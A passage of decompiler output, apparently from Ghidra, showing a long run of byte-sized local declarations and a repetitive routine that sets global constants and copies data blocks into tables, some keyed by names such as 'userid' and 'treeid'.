  undefined local_284;
  undefined local_283;
  undefined local_282;
  undefined local_281;
  undefined local_280;
  undefined local_27f;
  undefined local_27e;
  undefined local_27d;
  undefined local_27c;
  undefined local_27b;
  undefined local_27a;
  undefined local_279;
  undefined local_278;
  undefined local_277;
  undefined local_276;
  undefined local_275;
  undefined local_274;
  undefined local_273;
  undefined local_272;
  undefined local_271;
  undefined local_270;
  undefined local_26f;
  undefined local_26e;
  undefined local_26d;
  undefined local_26c;
  undefined local_26b;
  undefined local_26a;
  undefined local_269;
  undefined local_268;
  undefined local_267;
  undefined local_266;
  undefined local_265;
  undefined local_264;
  undefined local_263;
  undefined local_262;
  undefined local_261;
  undefined local_260;
  undefined local_25f;
  undefined local_25e;
  undefined local_25d;
  undefined local_25c;
  undefined local_25b;
  undefined local_25a;
  undefined local_259;
  undefined local_258;
  undefined local_257;
  undefined local_256;
  undefined local_255;
  undefined local_254;
  undefined local_253;
  undefined local_252;
  undefined local_251;
  undefined local_250;
  undefined local_24f;
  undefined local_24e;
  undefined local_24d;
  undefined local_24c;
  undefined local_24b;
  undefined local_24a;
  undefined local_249;
  undefined local_248;
  undefined local_247;
  undefined local_246;
  undefined local_245;
  undefined local_244;
  undefined local_243;
  undefined local_242;
  undefined local_241;
  undefined local_240;
  undefined local_23f;
  undefined local_23e;
  undefined local_23d;
  undefined local_23c;
  undefined local_23b;
  undefined local_23a;
  undefined local_239;
  undefined local_238;
  undefined local_237;
  undefined local_236;
  undefined local_235;
  undefined local_234;
  undefined local_233;
  undefined local_232;
  undefined local_231;
  undefined local_230;
  undefined local_22f;
  undefined local_22e;
  undefined local_22d;
  undefined local_22c;
  undefined local_22b;
  undefined local_22a;
  undefined local_229;
  undefined local_228;
  undefined local_227;
  undefined local_226;
  undefined local_225;
  undefined local_224;
  undefined local_223;
  undefined local_222;
  undefined local_221;
  undefined local_220;
  undefined local_21f;
  undefined local_21e;
  undefined local_21d;
  undefined local_21c;
  undefined local_21b;
  undefined local_21a;
  undefined local_219;
  undefined local_218;
  undefined local_217;
  undefined local_216;
  undefined local_215;
  undefined local_214;
  undefined local_213;
  undefined local_212;
  undefined local_211;
  undefined local_210;
  undefined local_20f;
  undefined local_20e;
  undefined local_20d;
  undefined local_20c;
  undefined local_20b;
  undefined local_20a;
  undefined local_209;
  undefined local_208;
  undefined local_207;
  undefined local_206;
  undefined local_205;
  undefined local_204;
  undefined local_203;
  undefined local_202;
  undefined local_201;
  undefined local_200;
  undefined local_1ff;
  undefined local_1fe;
  undefined local_1fd;
  undefined local_1fc;
  undefined local_1fb;
  undefined local_1fa;
  undefined local_1f9;
  undefined local_1f8;
  undefined local_1f7;
  undefined local_1f6;
  undefined local_1f5;
  undefined local_1f4;
  undefined local_1f3;
  undefined local_1f2;
  undefined local_1f1;
  undefined local_1f0;
  undefined local_1ef;
  undefined local_1ee;
  undefined local_1ed;
  undefined local_1ec;
  undefined local_1eb;
  undefined local_1ea;
  undefined local_1e9;
  undefined local_1e8;
  undefined local_1e7;
  undefined local_1e6;
  undefined local_1e5;
  undefined local_1e4;
  undefined local_1e3;
  undefined local_1e2;
  undefined local_1e1;
  undefined local_1e0;
  undefined local_1df;
  undefined local_1de;
  undefined local_1dd;
  undefined local_1dc;
  undefined local_1db;
  undefined local_1da;
  undefined local_1d9;
  undefined local_1d8;
  undefined local_1d7;
  undefined local_1d6;
  undefined local_1d5;
  undefined local_1d4;
  undefined local_1d3;
  undefined local_1d2;
  undefined local_1d1;
  undefined local_1d0;
  undefined local_1cf;
  undefined local_1ce;
  undefined local_1cd;
  undefined local_1cc;
  undefined local_1cb;
  undefined local_1ca;
  undefined local_1c9;
  undefined local_1c8;
  undefined local_1c7;
  undefined local_1c6;
  undefined local_1c5;
  undefined local_1c4;
  undefined local_1c3;
  undefined local_1c2;
  undefined local_1c1;
  undefined local_1c0;
  undefined local_1bf;
  undefined local_1be;
  undefined local_1bd;
  undefined local_1bc;
  undefined local_1bb;
  undefined local_1ba;
  undefined local_1b9;
  undefined local_1b8;
  undefined local_1b7;
  undefined local_1b6;
  undefined local_1b5;
  undefined local_1b4;
  undefined local_1b3;
  undefined local_1b2;
  undefined local_1b1;
  undefined local_1b0;
  undefined local_1af;
  undefined local_1ae;
  undefined local_1ad;
  undefined local_1ac;
  undefined local_1ab;
  undefined local_1aa;
  undefined local_1a9;
  undefined local_1a8;
  undefined local_1a7;
  undefined local_1a6;
  undefined local_1a5;
  undefined local_1a4;
  undefined local_1a3;
  undefined local_1a2;
  undefined local_1a1;
  undefined local_1a0;
  undefined local_19f;
  undefined local_19e;
  undefined local_19d;
  undefined local_19c;
  undefined local_19b;
  undefined local_19a;
  undefined local_199;
  undefined local_198;
  undefined local_197;
  undefined local_196;
  undefined local_195;
  undefined local_194;
  undefined local_193;
  undefined local_192;
  undefined local_191;
  undefined local_190;
  undefined local_18f;
  undefined local_18e;
  undefined local_18d;
  undefined local_18c;
  undefined local_18b;
  undefined local_18a;
  undefined local_189;
  undefined local_188;
  undefined local_187;
  undefined local_186;
  undefined local_185;
  undefined local_184;
  undefined local_183;
  undefined local_182;
  undefined local_181;
  undefined local_180;
  undefined local_17f;
  undefined local_17e;
  undefined local_17d;
  undefined local_17c;
  undefined local_17b;
  undefined local_17a;
  undefined local_179;
  undefined local_178;
  undefined local_177;
  undefined local_176;
  undefined local_175;
  undefined local_174;
  undefined local_173;
  undefined local_172;
  undefined local_171;
  undefined local_170;
  undefined local_16f;
  undefined local_16e;
  undefined local_16d;
  undefined local_16c;
  undefined local_16b;
  undefined local_16a;
  undefined local_169;
  undefined local_168;
  undefined local_167;
  undefined local_166;
  undefined local_165;
  undefined local_164;
  undefined local_163;
  undefined local_162;
  undefined local_161;
  undefined local_160;
  undefined local_15f;
  undefined local_15e;
  undefined local_15d;
  undefined local_15c;
  undefined local_15b;
  undefined local_15a;
  undefined local_159;
  undefined local_158;
  undefined local_157;
  undefined local_156;
  undefined local_155;
  undefined local_154;
  undefined local_153;
  undefined local_152;
  undefined local_151;
  undefined local_150;
  undefined local_14f;
  undefined local_14e;
  undefined local_14d;
  undefined local_14c;
  undefined local_14b;
  undefined local_14a;
  undefined local_149;
  undefined local_148;
  undefined local_147;
  undefined local_146;
  undefined local_145;
  undefined local_144;
  undefined local_143;
  undefined local_142;
  undefined local_141;
  undefined local_140;
  undefined local_13f;
  undefined local_13e;
  undefined local_13d;
  undefined local_13c;
  undefined local_13b;
  undefined local_13a;
  undefined local_139;
  undefined local_138;
  undefined local_137;
  undefined local_136;
  undefined local_135;
  undefined local_134;
  undefined local_133;
  undefined local_132;
  undefined local_131;
  undefined local_130;
  undefined local_12f;
  undefined local_12e;
  undefined local_12d;
  undefined local_12c;
  undefined local_12b;
  undefined local_12a;
  undefined local_129;
  undefined local_128;
  undefined local_127;
  undefined local_126;
  undefined local_125;
  undefined local_124;
  undefined local_123;
  undefined local_122;
  undefined local_121;
  undefined local_120;
  undefined local_11f;
  undefined local_11e;
  undefined local_11d;
  undefined local_11c;
  undefined local_11b;
  undefined local_11a;
  undefined local_119;
  undefined local_118;
  undefined local_117;
  undefined local_116;
  undefined local_115;
  undefined local_114;
  undefined local_113;
  undefined local_112;
  undefined local_111;
  undefined local_110;
  undefined local_10f;
  undefined local_10e;
  undefined local_10d;
  undefined local_10c;
  undefined local_10b;
  undefined local_10a;
  undefined local_109;
  undefined local_108;
  undefined local_107;
  undefined local_106;
  undefined local_105;
  undefined local_104;
  undefined local_103;
  undefined local_102;
  undefined local_101;
  undefined local_100;
  undefined local_ff;
  undefined local_fe;
  undefined local_fd;
  undefined local_fc;
  undefined local_fb;
  undefined local_fa;
  undefined local_f9;
  undefined local_f8;
  undefined local_f7;
  undefined local_f6;
  undefined local_f5;
  undefined local_f4;
  undefined local_f3;
  undefined local_f2;
  undefined local_f1;
  undefined local_f0;
  undefined local_ef;
  undefined local_ee;
  undefined local_ed;
  undefined local_ec;
  undefined local_eb;
  undefined local_ea;
  undefined local_e9;
  undefined local_e8;
  undefined local_e7;
  undefined local_e6;
  undefined local_e5;
  undefined local_e4;
  undefined local_e3;
  undefined local_e2;
  undefined local_e1;
  undefined local_e0;
  undefined local_df;
  undefined local_de;
  undefined local_dd;
  undefined local_dc;
  undefined local_db;
  undefined local_da;
  undefined local_d9;
  undefined local_d8;
  undefined local_d7;
  undefined local_d6;
  undefined local_d5;
  undefined local_d4;
  undefined local_d3;
  undefined local_d2;
  undefined local_d1;
  undefined local_d0;
  undefined local_cf;
  undefined local_ce;
  undefined local_cd;
  undefined local_cc;
  undefined local_cb;
  undefined local_ca;
  undefined local_c9;
  undefined local_c8;
  undefined local_c7;
  undefined local_c6;
  undefined local_c5;
  undefined local_c4;
  undefined local_c3;
  undefined local_c2;
  undefined local_c1;
  undefined local_c0;
  undefined local_bf;
  undefined local_be;
  undefined local_bd;
  undefined local_bc;
  undefined local_bb;
  undefined local_ba;
  undefined local_b9;
  undefined local_b8;
  undefined local_b7;
  undefined local_b6;
  undefined local_b5;
  undefined local_b4;
  undefined local_b3;
  undefined local_b2;
  undefined local_b1;
  undefined local_b0;
  undefined local_af;
  undefined local_ae;
  undefined local_ad;
  undefined local_ac;
  undefined local_ab;
  undefined local_aa;
  undefined local_a9;
  undefined local_a8;
  undefined local_a7;
  undefined local_a6;
  undefined local_a5;
  undefined local_a4;
  undefined local_a3;
  undefined local_a2;
  undefined local_a1;
  undefined local_a0;
  undefined local_9f;
  undefined local_9e;
  undefined local_9d;
  undefined local_9c;
  undefined local_9b;
  undefined local_9a;
  undefined local_99;
  undefined local_98;
  undefined local_97;
  undefined local_96;
  undefined local_95;
  undefined local_94;
  undefined local_93;
  undefined local_92;
  undefined local_91;
  undefined local_90;
  undefined local_8f;
  undefined local_8e;
  undefined local_8d;
  undefined local_8c;
  undefined local_8b;
  undefined local_8a;
  undefined local_89;
  undefined local_88;
  undefined local_87;
  undefined local_86;
  undefined local_85;
  undefined local_84;
  undefined local_83;
  undefined local_82;
  undefined local_81;
  undefined local_80;
  undefined local_7f;
  undefined local_7e;
  undefined local_7d;
  undefined local_7c;
  undefined local_7b;
  undefined local_7a;
  undefined local_79;
  undefined local_78;
  undefined local_77;
  undefined local_76;
  undefined local_75;
  undefined local_74;
  undefined local_73;
  undefined local_72;
  undefined local_71;
  undefined local_70;
  undefined local_6f;
  undefined local_6e;
  undefined local_6d;
  undefined local_6c;
  undefined local_6b;
  undefined local_6a;
  undefined local_69;
  undefined local_68;
  undefined local_67;
  undefined local_66;
  undefined local_65;
  undefined local_64;
  undefined local_63;
  undefined local_62;
  undefined local_61;
  undefined local_60;
  undefined local_5f;
  undefined local_5e;
  undefined local_5d;
  undefined local_5c;
  undefined local_5b;
  undefined local_5a;
  undefined local_59;
  undefined local_58;
  undefined local_57;
  undefined local_56;
  undefined local_55;
  undefined local_54;
  undefined local_53;
  undefined local_52;
  undefined local_51;
  undefined local_50;
  undefined local_4f;
  undefined local_4e;
  undefined local_4d;
  undefined local_4c;
  undefined local_4b;
  undefined local_4a;
  undefined local_49;
  undefined local_48;
  undefined local_47;
  undefined local_46;
  undefined local_45;
  undefined local_44;
  undefined local_43;
  undefined local_42;
  undefined local_41;
  undefined local_40;
  undefined local_3f;
  undefined local_3e;
  undefined local_3d;
  undefined local_3c;
  undefined local_3b;
  undefined local_3a;
  undefined local_39;
  undefined local_38;
  undefined local_37;
  undefined local_36;
  undefined local_35;
  undefined local_34;
  undefined local_33;
  undefined local_32;
  undefined local_31;
  undefined local_30;
  undefined local_2f;
  undefined local_2e;
  undefined local_2d;
  undefined local_2c;
  undefined local_2b;
  undefined local_2a;
  undefined local_29;
  undefined local_28;
  undefined local_27;
  undefined local_26;
  undefined local_25;
  undefined local_24;
  undefined local_23;
  undefined local_22;
  undefined local_21;
  undefined local_20;
  undefined local_1f;
  undefined local_1e;
  undefined local_1d;
  undefined local_1c;
  undefined local_1b;
  undefined local_1a;
  undefined local_19;
  undefined local_18;
  undefined local_17;
  undefined local_16;
  undefined local_15;
  undefined local_14;
  undefined local_13;
  undefined local_12;
  undefined local_11;
  undefined local_10;
  undefined local_f;
  undefined local_e;
  undefined local_d;
  undefined local_c;
  undefined local_b;
  undefined local_a;
  undefined local_9;
  
  iVar1 = 0x22;
  DAT_00431480 = 2;
  DAT_00431484 = 1;
  DAT_00433ba0._0_4_ = 0;
  DAT_00433ba0._4_4_ = 0;
  _DAT_00433ba8 = 0;
  _DAT_00433bac = 1;
  _DAT_00433bb0 = 0x89;
  puVar2 = &DAT_0041b924;
  puVar3 = &DAT_00433bb4;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  iVar1 = 0x23;
  DAT_004362c8._0_4_ = 0xa0000000;
  DAT_004362c8._4_4_ = 0x3f19b90e;
  _DAT_004362d0 = 1;
  _DAT_004362d4 = 1;
  _DAT_004389f0 = 0x8ac00000;
  _DAT_004389f4 = 0x3f87d760;
  _DAT_004389f8 = 0;
  _DAT_004389fc = 1;
  _DAT_00438a00 = 0x8c;
  puVar2 = &DAT_0041b9b0;
  puVar3 = &DAT_00438a04;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  _DAT_0043b130 = 0x6469;
  _DAT_0043b12c = 0x72657375;
  iVar1 = 0x1c;
  _DAT_0043b118 = 0xaec00000;
  _DAT_0043b11c = 0x3f87fd66;
  _DAT_0043b120 = 1;
  _DAT_0043b124 = 1;
  _DAT_0043b128 = 6;
  _DAT_0043d840 = 0xa400000;
  _DAT_0043d844 = 0x3f842407;
  _DAT_0043d848 = 0;
  _DAT_0043d84c = 1;
  _DAT_0043d850 = 0x71;
  puVar2 = &DAT_0041ba3c;
  puVar3 = &DAT_0043d854;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  _DAT_0043ff80 = 0x6469;
  _DAT_0043ff7c = 0x65657274;
  _DAT_0043ff68 = 0xa0c00000;
  _DAT_0043ff6c = 0x3f84f55d;
  _DAT_0043ff70 = 1;
  _DAT_0043ff74 = 1;
  _DAT_0043ff78 = 6;
  _DAT_00442690 = 0x8fe00000;
  _DAT_00442694 = 0x3f84cd4a;
  _DAT_00442698 = 0;
  _DAT_0044269c = 1;
  _DAT_004426a0 = 0x466;
  iVar1 = 0x26;
  puVar2 = &DAT_0041bab0;
  puVar3 = &DAT_004426a4;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  iVar1 = 0x18;
  _DAT_00444db8 = 0xfb800000;
  _DAT_00444dbc = 0x3f8d6219;
  _DAT_00444dc0 = 1;
  _DAT_00444dc4 = 1;
  _DAT_004474e0 = 0xa6400000;
  _DAT_004474e4 = 0x3f882519;
  _DAT_004474e8 = 0;
  _DAT_004474ec = 1;
  _DAT_004474f0 = 0x5de;
  puVar2 = &DAT_0041bb4c;
  puVar3 = &DAT_004474f4;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = *(undefined2 *)puVar2;
  *(undefined *)((int)puVar3 + 2) = *(undefined *)((int)puVar2 + 2);
  iVar1 = 0xcd;
  _DAT_00449c08 = 0x63200000;
  _DAT_00449c0c = 0x3f88f700;
  _DAT_00449c10 = 0;
  _DAT_00449c14 = 1;
  _DAT_00449c18 = 0x5b4;
  puVar2 = &DAT_0041bbb0;
  puVar3 = &DAT_00449e9c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x134;
  _DAT_0044c330 = 0xb0000000;
  _DAT_0044c334 = 0x3f43a905;
  _DAT_0044c338 = 0;
  _DAT_0044c33c = 1;
  _DAT_0044c340 = 0x4d1;
  puVar2 = &DAT_0041bee4;
  puVar3 = &DAT_0044c344;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  iVar1 = 0x177;
  _DAT_0044ea58 = 0xd0000000;
  _DAT_0044ea5c = 0x3f147e6f;
  _DAT_0044ea60 = 0;
  _DAT_0044ea64 = 1;
  _DAT_0044ea68 = 0x5de;
  puVar2 = &DAT_0041c3b8;
  puVar3 = &DAT_0044ea6c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = *(undefined2 *)puVar2;
  iVar1 = 0x16d;
  _DAT_00451180 = 0xd5800000;
  _DAT_00451184 = 0x3f8ecd73;
  _DAT_00451188 = 0;
  _DAT_0045118c = 1;
  _DAT_00451190 = 0x5b4;
  puVar2 = &DAT_0041c998;
  puVar3 = &DAT_00451194;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x177;
  _DAT_004538a8 = 0xc0000000;
  _DAT_004538ac = 0x3f4608d3;
  _DAT_004538b0 = 0;
  _DAT_004538b4 = 1;
  _DAT_004538b8 = 0x5de;
  puVar2 = &DAT_0041cf4c;
  puVar3 = &DAT_004538bc;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = *(undefined2 *)puVar2;
  iVar1 = 0x16d;
  _DAT_00455fd0 = 0x44000000;
  _DAT_00455fd4 = 0x3f3fff8f;
  _DAT_00455fd8 = 0;
  _DAT_00455fdc = 1;
  _DAT_00455fe0 = 0x5b4;
  puVar2 = &DAT_0041d52c;
  puVar3 = &DAT_00455fe4;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  _DAT_004586f8 = 0x80000000;
  _DAT_004586fc = 0x3f0d9316;
  _DAT_00458700 = 0;
  _DAT_00458704 = 1;
  _DAT_00458708 = 0x5b4;
  iVar1 = 0x16d;
  puVar2 = &DAT_0041dae0;
  puVar3 = &DAT_0045870c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0xfb;
  _DAT_0045ae20 = 0x82c00000;
  _DAT_0045ae24 = 0x3f8a7ec5;
  _DAT_0045ae28 = 0;
  _DAT_0045ae2c = 1;
  _DAT_0045ae30 = 0x3ee;
  puVar2 = &DAT_0041e094;
  puVar3 = &DAT_0045ae34;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = *(undefined2 *)puVar2;
  iVar1 = 0x177;
  _DAT_0045d548 = 0x80000000;
  _DAT_0045d54c = 0x3f07cf18;
  _DAT_0045d550 = 0;
  _DAT_0045d554 = 1;
  _DAT_0045d558 = 0x5de;
  puVar2 = &DAT_0041e484;
  puVar3 = &DAT_0045d55c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = *(undefined2 *)puVar2;
  iVar1 = 0x16d;
  _DAT_0045fc70 = 0x60000000;
  _DAT_0045fc74 = 0x3f40144c;
  _DAT_0045fc78 = 0;
  _DAT_0045fc7c = 1;
  _DAT_0045fc80 = 0x5b4;
  puVar2 = &DAT_0041ea64;
  puVar3 = &DAT_0045fc84;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x134;
  _DAT_00462398 = 0xb0000000;
  _DAT_0046239c = 0x3f33a9d1;
  _DAT_004623a0 = 0;
  _DAT_004623a4 = 1;
  _DAT_004623a8 = 0x4d1;
  puVar2 = &DAT_0041f018;
  puVar3 = &DAT_004623ac;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  iVar1 = 0x177;
  _DAT_00464ac0 = 0x46000000;
  _DAT_00464ac4 = 0x3f4deac8;
  _DAT_00464ac8 = 0;
  _DAT_00464acc = 1;
  _DAT_00464ad0 = 0x5de;
  puVar2 = &DAT_0041f4ec;
  puVar3 = &DAT_00464ad4;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = *(undefined2 *)puVar2;
  iVar1 = 0x16d;
  _DAT_004671e8 = 0xe8000000;
  _DAT_004671ec = 0x3f3e140d;
  _DAT_004671f0 = 0;
  _DAT_004671f4 = 1;
  _DAT_004671f8 = 0x5b4;
  puVar2 = &DAT_0041facc;
  puVar3 = &DAT_004671fc;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x134;
  _DAT_00469910 = 0x66000000;
  _DAT_00469914 = 0x3f4098b6;
  _DAT_00469918 = 0;
  _DAT_0046991c = 1;
  _DAT_00469920 = 0x4d1;
  puVar2 = &DAT_00420080;
  puVar3 = &DAT_00469924;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  iVar1 = 0x177;
  _DAT_0046c038 = 0xe8000000;
  _DAT_0046c03c = 0x3f30c7b8;
  _DAT_0046c040 = 0;
  _DAT_0046c044 = 1;
  _DAT_0046c048 = 0x5de;
  puVar2 = &DAT_00420554;
  puVar3 = &DAT_0046c04c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = *(undefined2 *)puVar2;
  iVar1 = 0x16d;
  _DAT_0046e760 = 0x5b000000;
  _DAT_0046e764 = 0x3f8afba5;
  _DAT_0046e768 = 0;
  _DAT_0046e76c = 1;
  _DAT_0046e770 = 0x5b4;
  puVar2 = &DAT_00420b34;
  puVar3 = &DAT_0046e774;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x134;
  _DAT_00470e88 = 0xc8000000;
  _DAT_00470e8c = 0x3f27eb36;
  _DAT_00470e90 = 0;
  _DAT_00470e94 = 1;
  _DAT_00470e98 = 0x4d1;
  puVar2 = &DAT_004210e8;
  puVar3 = &DAT_00470e9c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  iVar1 = 0x177;
  _DAT_004735b0 = 0x80000000;
  _DAT_004735b4 = 0x3ef58c14;
  _DAT_004735b8 = 0;
  _DAT_004735bc = 1;
  _DAT_004735c0 = 0x5de;
  puVar2 = &DAT_004215bc;
  puVar3 = &DAT_004735c4;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = *(undefined2 *)puVar2;
  iVar1 = 0x16d;
  _DAT_00475cd8 = 0;
  _DAT_00475cdc = 0x3ef8c0b0;
  _DAT_00475ce0 = 0;
  _DAT_00475ce4 = 1;
  _DAT_00475ce8 = 0x5b4;
  puVar2 = &DAT_00421b9c;
  puVar3 = &DAT_00475cec;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x134;
  _DAT_00478400 = 0xc6000000;
  _DAT_00478404 = 0x3f48ca2c;
  _DAT_00478408 = 0;
  _DAT_0047840c = 1;
  _DAT_00478410 = 0x4d1;
  puVar2 = &DAT_00422150;
  puVar3 = &DAT_00478414;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  iVar1 = 0x177;
  _DAT_0047ab28 = 0;
  _DAT_0047ab2c = 0x3f058762;
  _DAT_0047ab30 = 0;
  _DAT_0047ab34 = 1;
  _DAT_0047ab38 = 0x5de;
  puVar2 = &DAT_00422624;
  puVar3 = &DAT_0047ab3c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = *(undefined2 *)puVar2;
  iVar1 = 0x16d;
  _DAT_0047d250 = 0x55200000;
  _DAT_0047d254 = 0x3f913347;
  _DAT_0047d258 = 0;
  _DAT_0047d25c = 1;
  _DAT_0047d260 = 0x5b4;
  puVar2 = &DAT_00422c04;
  puVar3 = &DAT_0047d264;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x134;
  _DAT_0047f978 = 0xe4000000;
  _DAT_0047f97c = 0x3f3fb4cc;
  _DAT_0047f980 = 0;
  _DAT_0047f984 = 1;
  _DAT_0047f988 = 0x4d1;
  puVar2 = &DAT_004231b8;
  puVar3 = &DAT_0047f98c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  _DAT_004820a0 = 0xe0000000;
  _DAT_004820a4 = 0x3f07cacc;
  _DAT_004820a8 = 0;
  _DAT_004820ac = 1;
  iVar1 = 0x177;
  _DAT_004820b0 = 0x5de;
  puVar2 = &DAT_0042368c;
  puVar3 = &DAT_004820b4;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = *(undefined2 *)puVar2;
  iVar1 = 0x16d;
  _DAT_004847c8 = 0x20000000;
  _DAT_004847cc = 0x3f1372ac;
  _DAT_004847d0 = 0;
  _DAT_004847d4 = 1;
  _DAT_004847d8 = 0x5b4;
  puVar2 = &DAT_00423c6c;
  puVar3 = &DAT_004847dc;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x134;
  _DAT_00486ef0 = 0x70000000;
  _DAT_00486ef4 = 0x3f2af887;
  _DAT_00486ef8 = 0;
  _DAT_00486efc = 1;
  _DAT_00486f00 = 0x4d1;
  puVar2 = &DAT_00424220;
  puVar3 = &DAT_00486f04;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  iVar1 = 0x177;
  _DAT_00489618 = 0x70000000;
  _DAT_0048961c = 0x3f1cafdb;
  _DAT_00489620 = 0;
  _DAT_00489624 = 1;
  _DAT_00489628 = 0x5de;
  puVar2 = &DAT_004246f4;
  puVar3 = &DAT_0048962c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = *(undefined2 *)puVar2;
  iVar1 = 0x16d;
  _DAT_0048bd40 = 0x4e200000;
  _DAT_0048bd44 = 0x3f920a9d;
  _DAT_0048bd48 = 0;
  _DAT_0048bd4c = 1;
  _DAT_0048bd50 = 0x5b4;
  puVar2 = &DAT_00424cd4;
  puVar3 = &DAT_0048bd54;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x134;
  _DAT_0048e468 = 0x20000000;
  _DAT_0048e46c = 0x3f09f676;
  _DAT_0048e470 = 0;
  _DAT_0048e474 = 1;
  _DAT_0048e478 = 0x4d1;
  puVar2 = &DAT_00425288;
  puVar3 = &DAT_0048e47c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
